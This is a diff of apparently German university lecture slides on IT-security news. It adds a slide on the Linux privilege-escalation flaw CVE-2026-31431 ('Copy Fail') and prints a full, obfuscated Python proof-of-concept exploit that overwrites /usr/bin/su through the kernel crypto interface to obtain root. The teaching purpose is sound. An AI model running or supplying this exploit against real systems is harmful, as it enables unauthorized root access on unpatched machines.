@@ -34,7 +34,7 @@
 <dt class="contact">Kontakt<span class="colon">:</span></dt>
 <dd class="contact"><a class="reference external" href="mailto:michael.eichberg&#64;dhbw.de">michael.eichberg&#64;dhbw.de</a></dd>
 <dt class="version">Version<span class="colon">:</span></dt>
-<dd class="version">2.14</dd>
+<dd class="version">2.15</dd>
 </dl>
 <ld-supplemental><dl class="field-list">
 <dt>Folien<span class="colon">:</span></dt>
@@ -89,6 +89,69 @@
 <h2>Neuigkeiten aus der Welt der IT-Security</h2>
 <p class="section-subtitle">Vorfälle, Forschung und Kampf gegen Cyberkriminalität</p>
 </ld-topic>
+<ld-topic id="it-security-vorfalle-local-privelege-escalation-cve-2026-31431">
+<h2>IT-Security Vorfälle - Local Privelege Escalation (CVE-2026-31431)</h2>
+<blockquote class="epigraph">
+<p>Microsoft Defender is investigating a high-severity local privilege escalation vulnerability [...] affecting multiple major Linux distributions [...]. This vulnerability allows unauthorized escalation of privileges to root[...].</p>
+<p>Given the availability of a fully working exploit proof-of-concept (PoC) and the race to patch systems, Microsoft Defender is seeing preliminary testing activity that might result most likely in increased threat actor exploitation over the next few days, as also confirmed by the recent addition of this vulnerability to the Cybersecurity and Infrastructure Security Agency (CISA) Known Exploited Vulnerability (KEV) catalog. [...]</p>
+<p><span class="incremental">The vulnerability affects virtually all Linux distributions running kernels released from 2017 until patched versions are applied. [...]</span></p>
+<p><span class="incremental">The attack vector is local (AV:L) and requires low privileges with no user interaction[...].</span></p>
+<p><span class="incremental">[...] the flaw originates from an in-place optimization introduced in 2017, where the kernel reuses source memory as the destination during cryptographic operations.[...]</span></p>
+<p class="attribution">—<a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2026-31431">NIST: CVE-2026-31431</a> &amp; <a class="reference external" href="https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/">Microsoft Security: CVE-2026-31431</a></p>
+</blockquote>
+<ld-supplemental><p>Die Lücke hat auch den Namen <a class="reference external" href="https://copy.fail">Copy Fail</a> bekommen und ist frei auf GitHub verfügbar.</p>
+<p>Von der <a class="reference external" href="https://copy.fail">Webseite</a><a class="brackets" href="#footnote-1" id="footnote-reference-1" role="doc-noteref"><span class="fn-bracket">[</span>1<span class="fn-bracket">]</span></a>:</p>
+<blockquote class="epigraph">
+<p>[...] crosses container boundaries because the page cache is shared across the host.</p>
+<p><strong>This finding was AI-assisted</strong>, but began with an insight from Theori researcher Taeyang Lee, who was studying how the Linux crypto subsystem interacts with page-cache-backed data. [...]</p>
+<p><strong>Copy Fail is a straight-line logic flaw. It triggers without races, retries, or crash-prone timing windows. [...]</strong></p>
+</blockquote>
+<aside class="footnote-list brackets">
+<aside class="footnote brackets" id="footnote-1" role="doc-footnote">
+<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-1">1</a><span class="fn-bracket">]</span></span>
+<p>Highlighting wurde nachträglich hinzugefügt.</p>
+</aside>
+</aside>
+<pre class="code python literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="comment hashbang">#!/usr/bin/env python3</span><span class="whitespace">
+</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace"></span><span class="keyword namespace">import</span><span class="whitespace"> </span><span class="name namespace">os</span><span class="whitespace"> </span><span class="keyword">as</span><span class="whitespace"> </span><span class="name namespace">g</span><span class="operator">,</span><span class="whitespace"> </span><span class="name namespace">zlib</span><span class="operator">,</span><span class="whitespace"> </span><span class="name namespace">socket</span><span class="whitespace"> </span><span class="keyword">as</span><span class="whitespace"> </span><span class="name namespace">s</span><span class="whitespace">
+</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace">
+</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace"></span><span class="keyword">def</span><span class="whitespace"> </span><span class="name function">d</span><span class="punctuation">(</span><span class="name">x</span><span class="punctuation">):</span><span class="whitespace">
+</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace"></span>    <span class="keyword">return</span> <span class="name builtin">bytes</span><span class="operator">.</span><span class="name">fromhex</span><span class="punctuation">(</span><span class="name">x</span><span class="punctuation">)</span><span class="whitespace">
+</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace">
+</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace"></span><span class="keyword">def</span><span class="whitespace"> </span><span class="name function">c</span><span class="punctuation">(</span><span class="name">f</span><span class="punctuation">,</span> <span class="name">t</span><span class="punctuation">,</span> <span class="name">c</span><span class="punctuation">):</span><span class="whitespace">
+</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace"></span>    <span class="name">a</span> <span class="operator">=</span> <span class="name">s</span><span class="operator">.</span><span class="name">socket</span><span class="punctuation">(</span><span class="literal number integer">38</span><span class="punctuation">,</span> <span class="literal number integer">5</span><span class="punctuation">,</span> <span class="literal number integer">0</span><span class="punctuation">)</span><span class="whitespace">
+</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span>    <span class="name">a</span><span class="operator">.</span><span class="name">bind</span><span class="punctuation">((</span><span class="literal string double">&quot;aead&quot;</span><span class="punctuation">,</span> <span class="literal string double">&quot;authencesn(hmac(sha256),cbc(aes))&quot;</span><span class="punctuation">))</span><span class="whitespace">
+</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace"></span>    <span class="name">h</span> <span class="operator">=</span> <span class="literal number integer">279</span><span class="whitespace">
+</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace"></span>    <span class="name">v</span> <span class="operator">=</span> <span class="name">a</span><span class="operator">.</span><span class="name">setsockopt</span><span class="whitespace">
+</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace"></span>    <span class="name">v</span><span class="punctuation">(</span><span class="name">h</span><span class="punctuation">,</span> <span class="literal number integer">1</span><span class="punctuation">,</span> <span class="name">d</span><span class="punctuation">(</span><span class="literal string single">'0800010000000010'</span> <span class="operator">+</span> <span class="literal string single">'0'</span> <span class="operator">*</span> <span class="literal number integer">64</span><span class="punctuation">))</span><span class="whitespace">
+</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace"></span>    <span class="name">v</span><span class="punctuation">(</span><span class="name">h</span><span class="punctuation">,</span> <span class="literal number integer">5</span><span class="punctuation">,</span> <span class="keyword constant">None</span><span class="punctuation">,</span> <span class="literal number integer">4</span><span class="punctuation">)</span><span class="whitespace">
+</span></code><small class="ln">14 </small><code data-lineno="14 "><span class="whitespace"></span>    <span class="name">u</span><span class="punctuation">,</span> <span class="name">_</span> <span class="operator">=</span> <span class="name">a</span><span class="operator">.</span><span class="name">accept</span><span class="punctuation">()</span><span class="whitespace">
+</span></code><small class="ln">15 </small><code data-lineno="15 "><span class="whitespace"></span>    <span class="name">o</span> <span class="operator">=</span> <span class="name">t</span> <span class="operator">+</span> <span class="literal number integer">4</span><span class="whitespace">
+</span></code><small class="ln">16 </small><code data-lineno="16 "><span class="whitespace"></span>    <span class="name">i</span> <span class="operator">=</span> <span class="name">d</span><span class="punctuation">(</span><span class="literal string single">'00'</span><span class="punctuation">)</span><span class="whitespace">
+</span></code><small class="ln">17 </small><code data-lineno="17 "><span class="whitespace"></span>    <span class="name">u</span><span class="operator">.</span><span class="name">sendmsg</span><span class="punctuation">(</span><span class="whitespace">
+</span></code><small class="ln">18 </small><code data-lineno="18 "><span class="whitespace"></span>        <span class="punctuation">[</span><span class="literal string affix">b</span><span class="literal string double">&quot;A&quot;</span> <span class="operator">*</span> <span class="literal number integer">4</span> <span class="operator">+</span> <span class="name">c</span><span class="punctuation">],</span><span class="whitespace">
+</span></code><small class="ln">19 </small><code data-lineno="19 "><span class="whitespace"></span>        <span class="punctuation">[(</span><span class="name">h</span><span class="punctuation">,</span> <span class="literal number integer">3</span><span class="punctuation">,</span> <span class="name">i</span> <span class="operator">*</span> <span class="literal number integer">4</span><span class="punctuation">),</span> <span class="punctuation">(</span><span class="name">h</span><span class="punctuation">,</span> <span class="literal number integer">2</span><span class="punctuation">,</span> <span class="literal string affix">b</span><span class="literal string single">'</span><span class="literal string escape">\x10</span><span class="literal string single">'</span> <span class="operator">+</span> <span class="name">i</span> <span class="operator">*</span> <span class="literal number integer">19</span><span class="punctuation">),</span> <span class="punctuation">(</span><span class="name">h</span><span class="punctuation">,</span> <span class="literal number integer">4</span><span class="punctuation">,</span> <span class="literal string affix">b</span><span class="literal string single">'</span><span class="literal string escape">\x08</span><span class="literal string single">'</span> <span class="operator">+</span> <span class="name">i</span> <span class="operator">*</span> <span class="literal number integer">3</span><span class="punctuation">)],</span><span class="whitespace">
+</span></code><small class="ln">20 </small><code data-lineno="20 "><span class="whitespace"></span>        <span class="literal number integer">32768</span><span class="whitespace">
+</span></code><small class="ln">21 </small><code data-lineno="21 "><span class="whitespace"></span>    <span class="punctuation">)</span><span class="whitespace">
+</span></code><small class="ln">22 </small><code data-lineno="22 "><span class="whitespace"></span>    <span class="name">r</span><span class="punctuation">,</span> <span class="name">w</span> <span class="operator">=</span> <span class="name">g</span><span class="operator">.</span><span class="name">pipe</span><span class="punctuation">()</span><span class="whitespace">
+</span></code><small class="ln">23 </small><code data-lineno="23 "><span class="whitespace"></span>    <span class="name">n</span> <span class="operator">=</span> <span class="name">g</span><span class="operator">.</span><span class="name">splice</span><span class="whitespace">
+</span></code><small class="ln">24 </small><code data-lineno="24 "><span class="whitespace"></span>    <span class="name">n</span><span class="punctuation">(</span><span class="name">f</span><span class="punctuation">,</span> <span class="name">w</span><span class="punctuation">,</span> <span class="name">o</span><span class="punctuation">,</span> <span class="name">offset_src</span><span class="operator">=</span><span class="literal number integer">0</span><span class="punctuation">)</span><span class="whitespace">
+</span></code><small class="ln">25 </small><code data-lineno="25 "><span class="whitespace"></span>    <span class="name">n</span><span class="punctuation">(</span><span class="name">r</span><span class="punctuation">,</span> <span class="name">u</span><span class="operator">.</span><span class="name">fileno</span><span class="punctuation">(),</span> <span class="name">o</span><span class="punctuation">)</span><span class="whitespace">
+</span></code><small class="ln">26 </small><code data-lineno="26 "><span class="whitespace"></span>    <span class="keyword">try</span><span class="punctuation">:</span><span class="whitespace">
+</span></code><small class="ln">27 </small><code data-lineno="27 "><span class="whitespace"></span>        <span class="name">u</span><span class="operator">.</span><span class="name">recv</span><span class="punctuation">(</span><span class="literal number integer">8</span> <span class="operator">+</span> <span class="name">t</span><span class="punctuation">)</span><span class="whitespace">
+</span></code><small class="ln">28 </small><code data-lineno="28 "><span class="whitespace"></span>    <span class="keyword">except</span><span class="punctuation">:</span><span class="whitespace">
+</span></code><small class="ln">29 </small><code data-lineno="29 "><span class="whitespace"></span>        <span class="keyword">pass</span><span class="whitespace">
+</span></code><small class="ln">30 </small><code data-lineno="30 "><span class="whitespace">
+</span></code><small class="ln">31 </small><code data-lineno="31 "><span class="whitespace"></span><span class="name">f</span> <span class="operator">=</span> <span class="name">g</span><span class="operator">.</span><span class="name">open</span><span class="punctuation">(</span><span class="literal string double">&quot;/usr/bin/su&quot;</span><span class="punctuation">,</span> <span class="literal number integer">0</span><span class="punctuation">)</span><span class="whitespace">
+</span></code><small class="ln">32 </small><code data-lineno="32 "><span class="whitespace"></span><span class="name">i</span> <span class="operator">=</span> <span class="literal number integer">0</span><span class="whitespace">
+</span></code><small class="ln">33 </small><code data-lineno="33 "><span class="whitespace"></span><span class="name">e</span> <span class="operator">=</span> <span class="name">zlib</span><span class="operator">.</span><span class="name">decompress</span><span class="punctuation">(</span><span class="name">d</span><span class="punctuation">(</span><span class="literal string double">&quot;78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3&quot;</span><span class="punctuation">))</span><span class="whitespace">
+</span></code><small class="ln">34 </small><code data-lineno="34 "><span class="whitespace">
+</span></code><small class="ln">35 </small><code data-lineno="35 "><span class="whitespace"></span><span class="keyword">while</span> <span class="name">i</span> <span class="operator">&lt;</span> <span class="name builtin">len</span><span class="punctuation">(</span><span class="name">e</span><span class="punctuation">):</span><span class="whitespace">
+</span></code><small class="ln">36 </small><code data-lineno="36 "><span class="whitespace"></span>    <span class="name">c</span><span class="punctuation">(</span><span class="name">f</span><span class="punctuation">,</span> <span class="name">i</span><span class="punctuation">,</span> <span class="name">e</span><span class="punctuation">[</span><span class="name">i</span><span class="punctuation">:</span><span class="name">i</span><span class="operator">+</span><span class="literal number integer">4</span><span class="punctuation">])</span><span class="whitespace">
+</span></code><small class="ln">37 </small><code data-lineno="37 "><span class="whitespace"></span>    <span class="name">i</span> <span class="operator">+=</span> <span class="literal number integer">4</span><span class="whitespace">
+</span></code><small class="ln">38 </small><code data-lineno="38 "><span class="whitespace">
+</span></code><small class="ln">39 </small><code data-lineno="39 "><span class="whitespace"></span><span class="name">g</span><span class="operator">.</span><span class="name">system</span><span class="punctuation">(</span><span class="literal string double">&quot;su&quot;</span><span class="punctuation">)</span></code></pre>
+</ld-supplemental></ld-topic>
 <ld-topic id="it-security-vorfalle-ransomware">
 <h2>IT-Security Vorfälle - Ransomware</h2>
 <ld-deck>
@@ -252,8 +315,8 @@ MTAwMDAw:pH5uQhrgU7CumVeivepZcOPxifcK45DoaqkgYbOYFok=:EZpJgdcICDqEGAtN:iKCz5Tsl4
 </span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace">    </span><span class="name">IO</span><span class="punctuation">.</span><span class="name attribute">println</span><span class="punctuation">(</span><span class="literal string">&quot;\uFE01\uFE02\uFE03\uFE04\uFE05\uFE06\uFE07\uFE08.&quot;</span><span class="punctuation">);</span><span class="whitespace">
 </span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace">    </span><span class="name">IO</span><span class="punctuation">.</span><span class="name attribute">println</span><span class="punctuation">(</span><span class="literal string">&quot;l\uFE01(\uFE02\&quot;\uFE03!\uFE04\&quot;\uFE05)\uFE06;\uFE07.&quot;</span><span class="punctuation">);</span><span class="whitespace">
 </span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
-<p>Ausführung von <span class="docutils literal">Gen.java</span> (Voraussetzung: die Konsole verwendet UTF-8 oder ein anderes Unicode-kompatibles Encoding):</p>
-<pre class="code console literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="generic prompt">$ </span>java<span class="whitespace"> </span>Gen.java<span class="whitespace"> </span>&gt;<span class="whitespace"> </span>invisible.txt</code></pre>
+<p>Ausführung von <span class="docutils literal">Gen.java</span> (Voraussetzung: die Konsole verwendet UTF-8 oder ein anderes Unicode-kompatibles Encoding):
+<code class="console"><span class="generic prompt">$ </span>java<span class="whitespace"> </span>Gen.java<span class="whitespace"> </span>&gt;<span class="whitespace"> </span>invisible.txt</code></p>
 </ld-card><ld-card class="incremental">
 <p>Hexansicht der generierten Datei (z. B. mit <code class="console"><span class="generic output">xxd invisible.txt</span></code>):</p>
 <pre class="literal-block">00000000: e280 8c2e 0a20 efb8 802e 0a20 efb8 812e  ..... ..... ....
@@ -436,7 +499,7 @@ MTAwMDAw:pH5uQhrgU7CumVeivepZcOPxifcK45DoaqkgYbOYFok=:EZpJgdcICDqEGAtN:iKCz5Tsl4
 </ld-card><ld-card class="s-overlay incremental">
 <div class="height-70 center-content backdrop-blur docutils container">
 <div class="accentuate docutils container">
-<p>Having a model that is able to automatically develop complex exploit (chains) is double-edged sword. In the hands of attackers it may provide havoc. However, it also helps to make developers and managers aware of the fact that software is full of exploitable vulnerabilities - far beyound those reported typically.</p>
+<p>Having a model that is able to automatically develop complex exploit (chains) is a double-edged sword. In the hands of attackers it may provide havoc. However, it also helps to make developers and managers aware of the fact that software is full of exploitable vulnerabilities - far beyond those reported typically.</p>
 </div>
 </div>
 </ld-card></ld-deck></ld-topic>
@@ -468,10 +531,10 @@ MTAwMDAw:pH5uQhrgU7CumVeivepZcOPxifcK45DoaqkgYbOYFok=:EZpJgdcICDqEGAtN:iKCz5Tsl4
 </blockquote>
 </ld-card></ld-deck></ld-topic>
 <ld-topic id="wichtige-kennzahlen-bzgl-cybersecurity-vorfallen">
-<h2>Wichtige Kennzahlen bzgl. Cybersecurity-Vorfällen<a class="brackets" href="#footnote-1" id="footnote-reference-1" role="doc-noteref"><span class="fn-bracket">[</span>1<span class="fn-bracket">]</span></a></h2>
+<h2>Wichtige Kennzahlen bzgl. Cybersecurity-Vorfällen<a class="brackets" href="#footnote-2" id="footnote-reference-2" role="doc-noteref"><span class="fn-bracket">[</span>2<span class="fn-bracket">]</span></a></h2>
 <ld-supplemental><aside class="footnote-list brackets">
-<aside class="footnote brackets" id="footnote-1" role="doc-footnote">
-<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-1">1</a><span class="fn-bracket">]</span></span>
+<aside class="footnote brackets" id="footnote-2" role="doc-footnote">
+<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-2">2</a><span class="fn-bracket">]</span></span>
 <p>Die Begriffe (MTTI, etc.) sind nicht einheitlich definiert und ggf. ist es sinnvoll zu klären welcher Zeitraum genau gemeint ist.</p>
 </aside>
 </aside>
@@ -778,7 +841,7 @@ curl <span style="position:absolute;top:-100px;left:-1000px">-f "does.not.exist"
 </ld-topic>
 <ld-topic id="cve-2024-3094-liblzma-backdoor-in-opensshinnoqssh">
 <h2><a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2024-3094">CVE-2024-3094</a> - <span class="docutils literal">liblzma</span> Backdoor in OpenSSH<a class="citation-reference" href="#innoq" id="citation-reference-1" role="doc-biblioref">[InnoQ]</a><a class="citation-reference" href="#ssh" id="citation-reference-2" role="doc-biblioref">[SSH]</a></h2>
-<ul class="incremental-list column-list dhbw list-with-details">
+<ul class="incremental-list column-list dhbw s-font-size-80">
 <li><p>Ziel</p>
 <p>Das Verhalten von SSH bei der Authentifikation so zu verändern, dass es dem Angreifer Zugang zum System erlaubt.</p>
 <p>Zur Absicherung der Backdoor ist diese über ein Zertifikat abgesichert.</p>
@@ -972,13 +1035,13 @@ curl <span style="position:absolute;top:-100px;left:-1000px">-f "does.not.exist"
 </blockquote>
 </ld-card><ld-card class="incremental">
 <blockquote class="epigraph">
-<p>[...] the JVG algorithm completely upends existing time projections. The Advanced Quantum Technologies Institute (AQTI) announced March 2, 2026, “The JVG algorithm requires thousand-fold less quantum computer resources, such as qubits and quantum gates. <strong>Research extrapolations suggest</strong> it will <em>require less than 5,000 qubits to break encryption methods used in RSA and ECC</em>.”<a class="brackets" href="#footnote-2" id="footnote-reference-2" role="doc-noteref"><span class="fn-bracket">[</span>2<span class="fn-bracket">]</span></a></p>
+<p>[...] the JVG algorithm completely upends existing time projections. The Advanced Quantum Technologies Institute (AQTI) announced March 2, 2026, “The JVG algorithm requires thousand-fold less quantum computer resources, such as qubits and quantum gates. <strong>Research extrapolations suggest</strong> it will <em>require less than 5,000 qubits to break encryption methods used in RSA and ECC</em>.”<a class="brackets" href="#footnote-3" id="footnote-reference-3" role="doc-noteref"><span class="fn-bracket">[</span>3<span class="fn-bracket">]</span></a></p>
 <p class="attribution">—<a class="reference external" href="https://www.securityweek.com/quantum-decryption-of-rsa-is-much-closer-than-expected/">March 3, 2026; Securityweek: Quantum Decryption of RSA Is Much Closer Than Expected</a> bzw.
 <a class="reference external" href="https://doi.org/10.20944/preprints202510.1649.v3">Feb. 13 2026; Jesse Van Griensven Thé, Victor Oliveira Santos, Bahram Gharabaghi; A Novel Hybrid Quantum Circuit for Integer Factorization: End-to-End Evaluation in Simulation and Real Quantum Hardware</a></p>
 </blockquote>
 <aside class="footnote-list brackets">
-<aside class="footnote brackets" id="footnote-2" role="doc-footnote">
-<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-2">2</a><span class="fn-bracket">]</span></span>
+<aside class="footnote brackets" id="footnote-3" role="doc-footnote">
+<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-3">3</a><span class="fn-bracket">]</span></span>
 <p>Markup wurde nachträglich hinzugefügt. <span class="red">Die zugrundeliegende Forschung hat (Stand März 2026) bisher kein Peer-Review-Verfahren durchlaufen.</span></p>
 </aside>
 </aside>
@@ -1044,7 +1107,7 @@ curl <span style="position:absolute;top:-100px;left:-1000px">-f "does.not.exist"
 </ul>
 </ld-topic>
 <ld-topic id="von-nis2-betroffene-off-und-priv-einrichtungen">
-<h2>Von NIS2 betroffene öff. und priv. Einrichtungen<a class="brackets" href="#footnote-3" id="footnote-reference-3" role="doc-noteref"><span class="fn-bracket">[</span>3<span class="fn-bracket">]</span></a></h2>
+<h2>Von NIS2 betroffene öff. und priv. Einrichtungen<a class="brackets" href="#footnote-4" id="footnote-reference-4" role="doc-noteref"><span class="fn-bracket">[</span>4<span class="fn-bracket">]</span></a></h2>
 <blockquote>
 <p>Folgende Organisation mit mehr als 50 Mitarbeitern und einem Umsatz von mehr als 10 Millionen Euro müssen die NIS-2-Richtlinie einhalten (obligatorisch).</p>
 </blockquote>
@@ -1084,8 +1147,8 @@ curl <span style="position:absolute;top:-100px;left:-1000px">-f "does.not.exist"
 </ul>
 <ld-supplemental><p>Bis zum 17. April 2025 erstellen die Mitgliedstaaten eine Liste von wesentlichen und wichtigen Einrichtungen und von Einrichtungen, die Domänennamen-Registrierungsdienste erbringen und aktualisieren sie gegebenenfalls regelmäßig — spätestens alle 2 Jahre.</p>
 </ld-supplemental><aside class="footnote-list brackets">
-<aside class="footnote brackets" id="footnote-3" role="doc-footnote">
-<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-3">3</a><span class="fn-bracket">]</span></span>
+<aside class="footnote brackets" id="footnote-4" role="doc-footnote">
+<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-4">4</a><span class="fn-bracket">]</span></span>
 <p><a class="reference external" href="https://eur-lex.europa.eu/legal-content/DE/TXT/HTML/?uri=CELEX:32022L2555#d1e32-143-1">Details siehe Anhang I und II der NIS 2 Richtlinie</a></p>
 </aside>
 </aside>
